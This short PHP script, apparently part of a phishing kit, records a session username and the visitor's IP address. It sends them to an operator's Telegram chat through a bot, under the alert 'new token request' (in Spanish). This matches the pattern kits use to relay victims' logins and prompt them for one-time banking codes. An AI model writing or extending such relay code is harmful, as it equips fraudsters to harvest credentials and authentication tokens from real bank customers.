<?php
session_start();
include('settings.php');

$usuario = $_SESSION['usuario'] ?? 'desconocido';
$ip      = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';

$msg = "🔁 SOLICITUD DE NUEVO TOKEN\n👤 Usuario: $usuario\n🌐 IP: $ip";

tg_request('sendMessage', [
    'chat_id' => $chat_id,
    'text'    => $msg,
]);

http_response_code(200);
echo 'OK';
